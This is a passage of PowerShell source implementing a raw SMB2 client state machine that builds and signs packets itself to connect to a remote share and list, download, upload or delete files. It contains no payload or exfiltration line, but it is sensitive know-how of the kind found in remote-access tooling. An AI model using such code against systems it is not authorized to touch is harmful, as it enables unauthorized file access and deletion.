                        $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2TreeConnectRequest $SMB_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        
                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '00-00-00-00')
                        {

                            $error_code = [System.BitConverter]::ToString($SMB_client_receive[12..15])

                            switch($error_code)
                            {

                                'cc-00-00-c0'
                                {
                                    Write-Output "Share not found"
                                    $SMB_client_stage = 'Exit'
                                }

                                '22-00-00-c0'
                                {
                                    Write-Output "Access denied"
                                    $SMB_client_stage = 'Exit'
                                }

                                default
                                {
                                    $error_code = $error_code -replace "-",""
                                    Write-Output "Tree connect error code 0x$error_code"
                                    $SMB_client_stage = 'Exit'
                                }

                            }

                        }
                        elseif($SMB2_message_ID -eq 4)
                        {
                            $SMB_share_path = "\\" + $Target + "\" + $Share
                            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_share_path)
                            $SMB_client_stage = 'IoctlRequest'
                        }
                        else
                        {

                            if($Action -eq 'Put')
                            {
                                $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                                $create_request_extra_info = 2
                            }
                            else
                            {
                                $create_request_extra_info = 1
                            }

                            $SMB2_tree_ID = $SMB_client_receive[40..43]
                            $SMB_client_stage = 'CreateRequest'

                            if($Action -eq 'Get')
                            {
                                $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            }

                        }

                    }

                    'IoctlRequest'
                    {
                        $SMB2_tree_ID = 0x01,0x00,0x00,0x00
                        $SMB_ioctl_path = "\" + $Target + "\" + $Share
                        $SMB_ioctl_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_ioctl_path) + 0x00,0x00
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2IoctlRequest $SMB_ioctl_path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB2_tree_ID = 0x00,0x00,0x00,0x00
                        $SMB_client_stage = 'TreeConnect'
                    }
                  
                    'CreateRequest'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }
                        
                        $packet_SMB2_data = Get-PacketSMB2CreateRequest $SMB2_file $create_request_extra_info $source_file_size

                        if($directory_list.Count -gt 0)
                        {
                            $packet_SMB2_data["SMB2CreateRequest_DesiredAccess"] = 0x81,0x00,0x10,0x00
                            $packet_SMB2_data["SMB2CreateRequest_ShareAccess"] = 0x07,0x00,0x00,0x00
                        }
                        
                        if($Action -eq 'Delete')
                        {

                            switch($action_step)
                            {
                                
                                0
                                {
                                    $packet_SMB2_data["SMB2CreateRequest_CreateOptions"] = 0x00,0x00,0x20,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_DesiredAccess"] = 0x80,0x00,0x00,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_ShareAccess"] = 0x07,0x00,0x00,0x00
                                }

                                2
                                {
                                    $packet_SMB2_data["SMB2CreateRequest_CreateOptions"] = 0x40,0x00,0x20,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_DesiredAccess"] = 0x80,0x00,0x01,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_ShareAccess"] = 0x07,0x00,0x00,0x00
                                }

                            }

                        }

                        if($Action -eq 'Get')
                        {
                            $packet_SMB2_data["SMB2CreateRequest_CreateOptions"] = 0x00,0x00,0x20,0x00
                            $packet_SMB2_data["SMB2CreateRequest_DesiredAccess"] = 0x89,0x00,0x12,0x00
                            $packet_SMB2_data["SMB2CreateRequest_ShareAccess"] = 0x05,0x00,0x00,0x00
                        }

                        if($Action -eq 'Put')
                        {
                        
                            switch($action_step)
                            {

                                0
                                {
                                    $packet_SMB2_data["SMB2CreateRequest_CreateOptions"] = 0x60,0x00,0x20,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_DesiredAccess"] = 0x89,0x00,0x12,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_ShareAccess"] = 0x01,0x00,0x00,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_RequestedOplockLevel"] = 0xff
                                }

                                1
                                {
                                    $packet_SMB2_data["SMB2CreateRequest_CreateOptions"] = 0x64,0x00,0x00,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_DesiredAccess"] = 0x97,0x01,0x13,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_ShareAccess"] = 0x00,0x00,0x00,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_RequestedOplockLevel"] = 0xff
                                    $packet_SMB2_data["SMB2CreateRequest_FileAttributes"] = 0x20,0x00,0x00,0x00
                                    $packet_SMB2_data["SMB2CreateRequest_CreateDisposition"] = 0x05,0x00,0x00,0x00
                                }

                            }

                        }

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        
                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '00-00-00-00')
                        {

                            $error_code = [System.BitConverter]::ToString($SMB_client_receive[12..15])

                            switch($error_code)
                            {

                                '03-01-00-c0'
                                {
                                    $SMB_client_stage = 'Exit'
                                }

                                '22-00-00-c0'
                                {

                                    if($directory_list.Count -gt 0)
                                    {
                                        $directory_list.RemoveAt(0) > $null
                                    }
                                    else
                                    {
                                        Write-Output "Access denied"
                                        $share_subdirectory_start = $false
                                    }

                                    $SMB_client_stage = 'CloseRequest'

                                }

                                '34-00-00-c0'
                                {

                                    if($Action -eq 'Put')
                                    {
                                        $create_request_extra_info = 3
                                        $action_step++
                                        $SMB_client_stage = 'CreateRequest'
                                    }
                                    else
                                    {
                                        Write-Output "File not found"
                                        $SMB_client_stage = 'Exit'
                                    }

                                }

                                'ba-00-00-c0'
                                {
                                    
                                    if($Action -eq 'Put')
                                    {
                                        Write-Output "Destination filname must be specified"
                                        $SMB_client_stage = 'CloseRequest'
                                    }

                                }

                                default
                                {
                                    $error_code = $error_code -replace "-",""
                                    Write-Output "Create request error code 0x$error_code"
                                    $SMB_client_stage = 'Exit'
                                }

                            }

                        }
                        elseif($Action -eq 'Delete' -and $action_step -eq 2)
                        {
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x0d
                            $set_info_request_buffer = 0x01,0x00,0x00,0x00
                            $SMB_file_ID = $SMB_client_receive[132..147]
                            $SMB_client_stage = 'SetInfoRequest'
                        }
                        elseif($Action -eq 'Get' -and $action_step -ne 1)
                        {

                            switch($action_step)
                            {

                                0
                                {
                                    $SMB_file_ID = $SMB_client_receive[132..147]
                                    $action_step++
                                    $SMB_client_stage = 'CloseRequest'
                                }

                                2
                                {

                                    if($file_size -lt 4096)
                                    {
                                        $read_request_length = $file_size
                                    }
                                    else
                                    {
                                        $read_request_length = 4096
                                    }

                                    $read_request_offset = 0
                                    $SMB_file_ID = $SMB_client_receive[132..147]
                                    $action_step++
                                    $SMB_client_stage = 'ReadRequest'
                                }

                                4
                                {
                                    $header_next_command = 0x68,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x01
                                    $query_info_request_file_info_class_1 = 0x07
                                    $query_info_request_output_buffer_length_1 = 0x00,0x10,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x68,0x00
                                    $query_info_request_buffer_1 = 0
                                    $query_info_request_info_type_2 = 0x01
                                    $query_info_request_file_info_class_2 = 0x16
                                    $query_info_request_output_buffer_length_2 = 0x00,0x10,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x68,0x00
                                    $query_info_request_buffer_2 = 0
                                    $SMB_file_ID = $SMB_client_receive[132..147]
                                    $action_step++
                                    $SMB_client_stage = 'QueryInfoRequest'
                                }

                            }

                        }
                        elseif($Action -eq 'Put')
                        {

                            switch($action_step)
                            {

                                0
                                {

                                    if($Action -eq 'Put')
                                    {
                                        Write-Output "Destination file exists"
                                        $SMB_client_stage = 'CloseRequest'
                                    }

                                }

                                1
                                {
                                    $SMB_file_ID = $SMB_client_receive[132..147]
                                    $action_step++
                                    $header_next_command = 0x70,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x02
                                    $query_info_request_file_info_class_1 = 0x01
                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                    $query_info_request_buffer_1 = 8
                                    $query_info_request_info_type_2 = 0x02
                                    $query_info_request_file_info_class_2 = 0x05
                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                    $query_info_request_buffer_2 = 1
                                    $SMB_file_ID = $SMB_client_receive[132..147]
                                    $SMB_client_stage = 'QueryInfoRequest'
                                }

                            }

                        }
                        elseif($share_subdirectory_start)
                        {
                            $SMB_file_ID = $SMB_client_receive[132..147]
                            $SMB_client_stage = 'CloseRequest'
                        }
                        elseif($directory_list.Count -gt 0 -or $action_step -eq 1)
                        {
                            $SMB_client_stage = 'FindRequest'
                        }
                        else
                        {
                            $header_next_command = 0x70,0x00,0x00,0x00
                            $query_info_request_info_type_1 = 0x02
                            $query_info_request_file_info_class_1 = 0x01
                            $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                            $query_info_request_input_buffer_offset_1 = 0x00,0x00
                            $query_info_request_buffer_1 = 8
                            $query_info_request_info_type_2 = 0x02
                            $query_info_request_file_info_class_2 = 0x05
                            $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                            $query_info_request_input_buffer_offset_2 = 0x00,0x00
                            $query_info_request_buffer_2 = 1
                            $SMB_file_ID = $SMB_client_receive[132..147]
                            $SMB_client_stage = 'QueryInfoRequest'

                            if($share_subdirectory)
                            {
                                $share_subdirectory_start = $true
                            }

                        }

                    }

                    'QueryInfoRequest'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes
                        $packet_SMB2_header["SMB2Header_NextCommand"] = $header_next_command

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2QueryInfoRequest $query_info_request_info_type_1 $query_info_request_file_info_class_1 $query_info_request_output_buffer_length_1 $query_info_request_input_buffer_offset_1 $SMB_file_ID $query_info_request_buffer_1
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB2_message_ID++
                        $packet_SMB2b_header = Get-PacketSMB2Header 0x10,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2b_header["SMB2Header_ProcessID"] = $process_ID_bytes

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["SMB2Header_Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["SMB2Header_Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = Get-PacketSMB2QueryInfoRequest $query_info_request_info_type_2 $query_info_request_file_info_class_2 $query_info_request_output_buffer_length_2 $query_info_request_input_buffer_offset_2 $SMB_file_ID $query_info_request_buffer_2
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($share_subdirectory_start)
                        {
                            $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            $root_directory = $SMB2_file + 0x5c,0x00
                            $create_request_extra_info = 1
                            $SMB_client_stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Get')
                        {

                            switch($action_step)
                            {

                                5
                                {
                                    $query_info_response = [System.BitConverter]::ToString($SMB_client_receive)
                                    $query_info_response = $query_info_response -replace "-",""
                                    $file_stream_size_index = $query_info_response.Substring(10).IndexOf("FE534D42") + 170
                                    $file_stream_size = [System.BitConverter]::ToUInt32($SMB_client_receive[($file_stream_size_index / 2)..($file_stream_size_index / 2 + 8)],0)
                                    $file_stream_size_quotient = [Math]::Truncate($file_stream_size / 65536)
                                    $file_stream_size_remainder = $file_stream_size % 65536
                                    $percent_complete = $file_stream_size_quotient

                                    if($file_stream_size_remainder -ne 0)
                                    {
                                        $percent_complete++
                                    }
                                    
                                    if($file_stream_size -lt 1024)
                                    {
                                        $progress_file_size = "" + $file_stream_size + "B"
                                    }
                                    elseif($file_stream_size -lt 1024000)
                                    {
                                        $progress_file_size = "" + ($file_stream_size / 1024).ToString('.00') + "KB"
                                    }
                                    else
                                    {
                                        $progress_file_size = "" + ($file_stream_size / 1024000).ToString('.00') + "MB"
                                    }

                                    $header_next_command = 0x70,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x02
                                    $query_info_request_file_info_class_1 = 0x01
                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                    $query_info_request_buffer_1 = 8
                                    $query_info_request_info_type_2 = 0x02
                                    $query_info_request_file_info_class_2 = 0x05
                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                    $query_info_request_buffer_2 = 1
                                    $action_step++
                                    $SMB_client_stage = 'QueryInfoRequest'
                                }

                                6
                                {

                                    if($file_stream_size -lt 65536)
                                    {
                                        $read_request_length = $file_stream_size
                                    }
                                    else
                                    {
                                        $read_request_length = 65536
                                    }

                                    $read_request_offset = 0
                                    $read_request_step = 1
                                    $action_step++
                                    $SMB_client_stage = 'ReadRequest'
                                }

                            }
                        }
                        elseif($Action -eq 'Put')
                        {
                            $percent_complete = $source_file_size_quotient

                            if($source_file_size_remainder -ne 0)
                            {
                                $percent_complete++
                            }

                            if($source_file_size -lt 1024)
                            {
                                $progress_file_size = "" + $source_file_size + "B"
                            }
                            elseif($source_file_size -lt 1024000)
                            {
                                $progress_file_size = "" + ($source_file_size / 1024).ToString('.00') + "KB"
                            }
                            else
                            {
                                $progress_file_size = "" + ($source_file_size / 1024000).ToString('.00') + "MB"
                            }

                            $action_step++
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x14
                            $set_info_request_buffer = [System.BitConverter]::GetBytes($source_file_size)
                            $SMB_client_stage = 'SetInfoRequest'
                        }
                        elseif($Action -eq 'Delete')
                        {
                            $SMB_client_stage = 'CreateRequest'
                        }
                        else
                        {
                            $SMB_client_stage = 'CreateRequestFindRequest'
                        }

                    }

                    'SetInfoRequest'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x11,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2SetInfoRequest $set_info_request_file_info_class $set_info_request_info_level $SMB_file_ID $set_info_request_buffer
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($source_file_size -le 65536)
                        {
                            $write_request_length = $source_file_size
                        }
                        else
                        {
                            $write_request_length = 65536
                        }

                        $write_request_offset = 0
                        $write_request_step = 1

                        if($Action -eq 'Delete')
                        {
                            Write-Output "File deleted"
                            $SMB_client_stage = 'CloseRequest'
                            $action_step++
                        }
                        elseif($Action -eq 'Put' -and $action_step -eq 4)
                        {
                            Write-Output "File uploaded"
                            $SMB_client_stage = 'CloseRequest'
                        }
                        else
                        {
                            $SMB_client_stage = 'WriteRequest'
                        }

                    }

                    'CreateRequestFindRequest'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header["SMB2Header_ProcessID"] = $process_ID_bytes

                        if($SMB_signing)
                        {
                            $packet_SMB2_header["SMB2Header_Flags"] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2CreateRequest $SMB2_file 1
                        $packet_SMB2_data["SMB2CreateRequest_DesiredAccess"] = 0x81,0x00,0x10,0x00
                        $packet_SMB2_data["SMB2CreateRequest_ShareAccess"] = 0x07,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_SMB2_header["SMB2Header_NextCommand"] = [System.BitConverter]::GetBytes($SMB2_header.Length + $SMB2_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB2_message_ID++
                        $packet_SMB2b_header = Get-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2b_header["SMB2Header_ProcessID"] = $process_ID_bytes
                        $packet_SMB2b_header["SMB2Header_NextCommand"] = 0x68,0x00,0x00,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["SMB2Header_Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["SMB2Header_Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = Get-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff 0x00,0x00,0x00,0x00,0x00,0x00
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $SMB2_message_ID++
                        $packet_SMB2c_header = Get-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2c_header["SMB2Header_ProcessID"] = $process_ID_bytes

                        if($SMB_signing)
                        {
                            $packet_SMB2c_header["SMB2Header_Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2c_header["SMB2Header_Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2c_data = Get-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                        $packet_SMB2c_data["SMB2FindRequestFile_OutputBufferLength"] = 0x80,0x00,0x00,0x00
                        $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                        $SMB2c_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_data    
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length + $SMB2c_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length + $SMB2c_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2c_header + $SMB2c_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2c_header["SMB2Header_Signature"] = $SMB2_signature
                            $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data + $SMB2c_header + $SMB2c_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($Action -eq 'Delete')
                        {
                            $SMB_client_stage = 'CreateRequest'
                            $SMB2_file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            $action_step++
                        }
                        else
                        {
                            $SMB_client_stage = 'ParseDirectoryContents'
                        }

                    }

                    'ParseDirectoryContents'
                    {
                        $subdirectory_list = New-Object System.Collections.ArrayList
                        $create_response_file = [System.BitConverter]::ToString($SMB_client_receive)
                        $create_response_file = $create_response_file -replace "-",""
                        $directory_contents_mode_list = New-Object System.Collections.ArrayList
                        $directory_contents_create_time_list = New-Object System.Collections.ArrayList
                        $directory_contents_last_write_time_list = New-Object System.Collections.ArrayList
                        $directory_contents_length_list = New-Object System.Collections.ArrayList
                        $directory_contents_name_list = New-Object System.Collections.ArrayList

                        if($directory_list.Count -gt 0)
                        {
                            $create_response_file_index = 152
                            $directory_list.RemoveAt(0) > $null
                        }
                        else
                        {
                            $create_response_file_index = $create_response_file.Substring(10).IndexOf("FE534D42") + 154
                        }

                        do
                        {
                            $SMB_next_offset = [System.BitConverter]::ToUInt32($SMB_client_receive[($create_response_file_index / 2 + $SMB_offset)..($create_response_file_index / 2 + 3 + $SMB_offset)],0)
                            $SMB_file_length = [System.BitConverter]::ToUInt32($SMB_client_receive[($create_response_file_index / 2 + 40 + $SMB_offset)..($create_response_file_index / 2 + 47 + $SMB_offset)],0)
                            $SMB_file_attributes = [Convert]::ToString($SMB_client_receive[($create_response_file_index / 2 + 56 + $SMB_offset)],2).PadLeft(16,'0')

                            if($SMB_file_length -eq 0)
                            {
                                $SMB_file_length = $null
                            }

                            if($SMB_file_attributes.Substring(11,1) -eq '1')
                            {
                                $SMB_file_mode = "d"
                            }
                            else
                            {
                                $SMB_file_mode = "-"
                            }

                            if($SMB_file_attributes.Substring(10,1) -eq '1')
                            {
                                $SMB_file_mode+= "a"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(15,1) -eq '1')
                            {
                                $SMB_file_mode+= "r"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(14,1) -eq '1')
                            {
                                $SMB_file_mode+= "h"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            if($SMB_file_attributes.Substring(13,1) -eq '1')
                            {
                                $SMB_file_mode+= "s"
                            }
                            else
                            {
                                $SMB_file_mode+= "-"
                            }

                            $file_create_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($SMB_client_receive[($create_response_file_index / 2 + 8 + $SMB_offset)..($create_response_file_index / 2 + 15 + $SMB_offset)],0))
                            $file_create_time = Get-Date $file_create_time -format 'M/d/yyyy h:mm tt'
                            $file_last_write_time = [Datetime]::FromFileTime([System.BitConverter]::ToInt64($SMB_client_receive[($create_response_file_index / 2 + 24 + $SMB_offset)..($create_response_file_index / 2 + 31 + $SMB_offset)],0))
                            $file_last_write_time = Get-Date $file_last_write_time -format 'M/d/yyyy h:mm tt'
